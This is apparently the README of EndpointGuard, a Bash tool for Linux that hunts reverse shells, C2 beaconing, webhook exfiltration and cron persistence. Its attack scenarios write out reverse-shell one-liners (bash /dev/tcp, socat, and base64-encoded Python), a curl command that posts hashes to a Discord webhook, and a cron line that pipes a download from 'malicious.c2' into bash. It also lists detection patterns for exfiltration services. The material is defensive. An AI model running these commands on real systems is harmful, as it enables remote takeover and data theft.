<div align="center">

<!-- Modern glowing vector header logo -->
<svg width="180" height="180" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="headerGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#00f2fe" />
      <stop offset="50%" stop-color="#4facfe" />
      <stop offset="100%" stop-color="#000000" />
    </linearGradient>
    <linearGradient id="shieldBorder" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#00ffcc" />
      <stop offset="50%" stop-color="#a020f0" />
      <stop offset="100%" stop-color="#ff007f" />
    </linearGradient>
    <filter id="glowHeader" x="-30%" y="-30%" width="160%" height="160%">
      <feGaussianBlur stdDeviation="8" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
  </defs>
  <!-- Outer Cyber Hexagon -->
  <polygon points="100,10 185,50 185,150 100,190 15,150 15,50" fill="url(#headerGrad)" fill-opacity="0.15" stroke="url(#shieldBorder)" stroke-width="3" filter="url(#glowHeader)" />
  <!-- Tech Ring -->
  <circle cx="100" cy="100" r="75" stroke="#4facfe" stroke-width="1.5" stroke-dasharray="6 8" />
  <!-- Inner Shield Sentinel -->
  <path d="M100,35 C125,35 155,42 155,75 C155,120 120,150 100,168 C80,150 45,120 45,75 C45,42 75,35 100,35 Z" fill="#0c0e17" stroke="url(#shieldBorder)" stroke-width="4.5" stroke-linejoin="round" />
  <!-- Sentinel Core Node -->
  <circle cx="100" cy="90" r="14" fill="#000000" stroke="#00ffcc" stroke-width="2.5" filter="url(#glowHeader)" />
  <circle cx="100" cy="90" r="5" fill="#ff007f" />
  <!-- Tech lines -->
  <path d="M100,105 L100,145" stroke="#00ffcc" stroke-width="2" />
  <path d="M75,90 L60,90 M125,90 L140,90" stroke="#a020f0" stroke-width="2" />
</svg>

# 🛡️ EndpointGuard v5.1
### **Linux Sentinel — Real-time Reverse Shell, C2 & Persistence Hunter**

---

<p align="center">
  <a href="CHANGELOG.md">
    <img src="https://img.shields.io/badge/Release-v5.1.0-blueviolet?style=for-the-badge&logo=github" alt="Release Version">
  </a>
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge" alt="License">
  </a>
  <a href="https://www.gnu.org/software/bash/">
    <img src="https://img.shields.io/badge/Built_With-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white" alt="Built With Bash">
  </a>
  <a href="https://www.linux.org/">
    <img src="https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Platform Linux">
  </a>
  <a href="https://github.com/Mr-N1ck/EndpointGuard">
    <img src="https://img.shields.io/badge/Focus-Threat_Hunting-red?style=for-the-badge&logo=hackthebox&logoColor=white" alt="Focus Threat Hunting">
  </a>
  <a href="docs/ARCHITECTURE.md">
    <img src="https://img.shields.io/badge/Documentation-Guides-teal?style=for-the-badge&logo=readme" alt="Documentation Guides">
  </a>
</p>

**Pure-Bash endpoint security sentinel that hunts active reverse shells, cuts C2 channels, sandboxes payloads, and cleans persistence layers — operated entirely through an interactive menu.**

[🔬 Architecture Manual](docs/ARCHITECTURE.md) &nbsp;•&nbsp; [🛠️ Troubleshooting Guide](docs/TROUBLESHOOTING.md) &nbsp;•&nbsp; [📋 Changelog](CHANGELOG.md)

</div>

---

## 🚀 The Core Difference: Dynamic File Descriptor Auditing

Conventional security tools rely heavily on static string detection (like matching process command-line arguments in `ps` or running simple regex blocks). Adversaries bypass these by calling interactive shells with Base64 payloads, library pre-loading, or simply renaming interpreters.

**EndpointGuard works at the kernel descriptor layer.** It walks the active file descriptor inodes (`/proc/<pid>/fd`) to determine exactly where a shell is sending its input and output:

> *"Is this shell process currently holding an active network socket on stdin (`fd/0`), stdout (`fd/1`), or stderr (`fd/2`)?"*

If yes, the sentinel identifies it as an active reverse shell. **Language, name, or command obfuscation does not matter.**

<div align="center">

### 📊 Threat Coverage Comparison

| Intercept Target | Classic Security Agent | EndpointGuard v5 |
| :--- | :---: | :---: |
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | ❌ Missed once sub-processed | **✅ Terminated + Blocked** |
| `python -c "socket.connect()..."` | ❌ String matches bypassed | **✅ Intercepted via FD Walk** |
| `socat TCP:attacker:port EXEC:bash` | ❌ Bypassed (looks like standard daemon) | **✅ Intercepted via FD Walk** |
| **Telegram / Discord Exfiltration** | ❌ Allowed as standard HTTPS traffic | **✅ Flagged & Quarantined** |
| **Outbound C2 Beaconing** | ❌ Ignored without active threat rules | **✅ Dynamic Variance Analyzer** |
| **Persistence Backdoors** | ❌ Alert only | **✅ Cleaned + Autonomic Backup** |
| **TCP socket lingering** | ❌ Remained in `CLOSE_WAIT` | **✅ Severe at socket layer (`ss -K`)** |

</div>

---

## 🎮 Simulated Intrusion & Autonomic Defense Scenarios

To see EndpointGuard in action, here are three highly realistic attack scenarios showing how the sentinel automatically intercepts and neutralizes intrusions:

### 🛑 Scenario 1: Obfuscated Python Reverse Shell
* **The Attack**: An adversary executes a Base64-encoded Python one-liner to bypass standard command logging and establish a backdoor shell back to their listening host:
  ```bash
  python3 -c "import base64,sys;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMS4xMDAiLDkwMDEpKTtvdyhkdXAyaW4sMCk7b3cuZHVwMm91dCwxKTtvdyhkdHAyZXJyLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFs...'))"
  ```
* **Traditional Security Failure**: Standard process monitoring logs a generic, legitimate `python3` process and ignores it since the command arguments do not contain flags like `/bin/bash` or `nc`.
* **EndpointGuard Sentinel Defense**: 
  1. The **File Descriptor Sentinel** walks `/proc` and inspects the active stream file descriptors (`fd/0`, `fd/1`, `fd/2`) of the Python PID.
  2. It identifies that the streams are bound to an active network socket mapping to `192.168.1.100:9001` (external, non-whitelisted).
  3. **Threat Score**: Calculates **50+** (Instant execution trigger).
  4. **The Action**: 
     - Kills the Python process and its parent shell wrapper processes.
     - Severs the socket at the kernel layer using `ss -K dst 192.168.1.100`.
     - Deploys an iptables drop rule banning the attacker's IP.
     - Logs: `[EPG ALERT] [CRITICAL] Reverse shell detected! PID 14205 (python3) -> 192.168.1.100:9001. Action: Terminated process + dropped socket.`

### 🛑 Scenario 2: Silent Webhook Exfiltration
* **The Attack**: A dropper script located in a volatile system directory tries to read administrative hashes and POST them to an external Discord webhook:
  ```bash
  curl -H "Content-Type: application/json" -d '{"content": "Extracted Hashes: ..."}' https://discord.com/api/webhooks/12345/abcdef
  ```
* **Traditional Security Failure**: Default firewalls allow outbound HTTPS (port 443) traffic, letting the data slip out cleanly.
* **EndpointGuard Sentinel Defense**:
  1. The **Exfil & C2 Sweep Engine** scans `/tmp/` and detects the newly executed dropper payload.
  2. It sweeps the file contents and finds strings matching a Discord Webhook URL.
  3. **Threat Score**: Calculates **30+**.
  4. **The Action**:
     - The executing process is instantly terminated.
     - The script is sandboxed in the secure quarantine directory with absolute read/write lockout (`chmod 000`).
     - A Telegram security alert notification is dispatched to the admin immediately.

### 🛑 Scenario 3: Trojanized Cronjob Persistence
* **The Attack**: An attacker gains root access and leaves an hourly backdoor cronjob to pull down and run remote files:
  ```text
  0 * * * * root curl -s http://malicious.c2/drop.sh | bash
  ```
* **Traditional Security Failure**: Backdoors inside custom crontabs go completely unnoticed until a manual audit is performed.
* **EndpointGuard Sentinel Defense**:
  1. The **Deep Persistence Sweep** routinely audits all crontabs and system configuration profiles.
  2. It identifies the un-whitelisted remote payload URL inside `/etc/cron.d/`.
  3. **Threat Score**: Calculates **30+**.
  4. **The Action**:
     - Instantly cleanses the malicious line out of the cron configuration.
     - Saves a secure pre-cleaned backup file: `/etc/cron.d/sysupdates.epg_pre_clean.<timestamp>`.
     - Alerts the administrator via the Control Dashboard.

---

## ⚡ Interactive TUI Control Console

No configuration files to edit manually and no command line flags to memorize. Select a number in the polished terminal console to trigger sentinel actions:

```text
  🛡️ EndpointGuard v5.0 — Sentinel Console
  =========================================
   1) Start protection daemon
   2) Restart protection daemon
   3) Run on-demand security scan        <- hunt, terminate, and sandbox NOW
   4) Show status
   5) View logs / blocked / quarantine
   6) Block IP (manual)
   7) Unblock IP
   8) Test Telegram alerts
   9) Setup / reconfigure
  10) Install as systemd service
  11) Restore files from quarantine     <- new interactive recovery utility
  12) Uninstall completely
  13) About / what's new
   0) Exit
```

On first startup, EndpointGuard runs a **Smart Setup Wizard** that:
* Detects your network interfaces, current SSH administrative IP, and active subnets.
* Generates a persistent configuration profile at `/opt/.epg/config.conf`.
* Installs optional Telegram webhook integrations for immediate alert broadcasts.
* Automatically implements **Anti-Lockout Protection** to prevent you from ever accidentally blocking your admin shell.

---

## 📦 Installation & Quickstart

Get EndpointGuard running on your system in under a minute:

```bash
# Clone the sentinel repository
git clone https://github.com/Mr-N1ck/EndpointGuard.git
cd EndpointGuard

# Run the automated installer
sudo bash install.sh
```

To open the interactive sentinel console at any time, run:
```bash
sudo endpointguard
```

---

## 🔬 Under the Hood: Autonomous Sentinel Modules

<details>
<summary><b>1. File Descriptor Socket Walking</b> (Click to expand)</summary>

Every 3 seconds, the Sentinel daemon walks the active process list:
1. Identifies interpreter shells (`bash`, `python`, `perl`, `node`, `php`, etc.).
2. Checks if standard stream file descriptors point directly to sockets.
3. Resolves the socket inode to its remote IP.
4. Drops the connection instantly if the remote is external and non-whitelisted.
</details>

<details>
<summary><b>2. Exfiltration & C2 Sweep Engine</b> (Click to expand)</summary>

Continuously monitors volatile folders (`/tmp`, `/var/tmp`, `/dev/shm`, user homes) for exfiltration activity. It uses advanced regex patterns to scan for:
* Discord webhooks and webhook domains.
* Telegram bot tokens and API paths.
* SSH/HTTP tunneling structures (`ngrok`, `serveo`, `localtunnel`).
* Out-of-band collaboration interfaces (`webhook.site`, `pipedream`).
</details>

<details>
<summary><b>3. Dynamic Beaconing Analyzer</b> (Click to expand)</summary>

Measures connection intervals over a sliding 15-minute window to identify background C2 "heartbeats":
$$\sigma \le 30\text{ seconds over } 4\text{ consecutive logs}$$
If a process maintains connections to an external destination on a strict interval, it is flagged, terminated, and the target IP is blacklisted.
</details>

<details>
<summary><b>4. Secure Quarantine Sandbox</b> (Click to expand)</summary>

To prevent accidental file loss while maintaining rigorous forensics, the sentinel:
1. Strips all file permission bits (`chmod 000`).
2. Moves payloads to a secure sandbox at `/opt/.epg/quarantine/`.
3. Hashes the payload and registers its original metadata in a secure ledger.
4. Allows administrators to safely restore quarantined items anytime using **Option 11** in the TUI console.
</details>

---

## 🗂️ File Layout

All local configurations, active databases, and system logs are stored in a single organized directory:

```text
/opt/.epg/
├── endpointguard.sh          # Main sentinel binary
├── config.conf               # Generated setup wizard profile
├── epg.log                   # Comprehensive system activity ledger
├── alerts.log                # CRITICAL / HIGH level intrusion log
├── blocked.list              # Actively banned IP database
├── killed_conns.log          # Connection termination ledger
├── quarantine/               # Secure payload sandbox
│   └── quarantine.log        # Quarantine source database
├── honeypot/                 # Virtual environment for jailed administrative threats
├── baselines/                # System baseline hashes
└── pam_alerts.fifo           # Local inter-process FIFO communication channel
```

---

## 🔒 Security & Policy

* **Anti-Lockout Protection**: EndpointGuard always whitelist-checks your active administrative IP address during startup to prevent self-bans.
* **Granular Modes**: Run in `monitor` mode for zero active changes (safe on production databases), `moderate` for passive blocking, or `active` for full sentinel execution.
* For security disclosures or vulnerabilities, please review [SECURITY.md](SECURITY.md).

---

<!-- Centered, beautifully styled logo footer -->
<div align="center">

<img src="docs/images/logo.jpeg" width="120" height="120" style="border-radius: 50%; border: 3px solid #00ffcc; box-shadow: 0 0 15px rgba(0, 255, 204, 0.6);" alt="Prince Gaur Avatar" />

### **Created with 🛡️ by Prince Gaur ([@Mr-N1ck](https://github.com/Mr-N1ck))**
*Dedicated to securing the open-source Linux community.*

*If EndpointGuard saved your servers, please drop a ⭐ on our repository!*

</div>
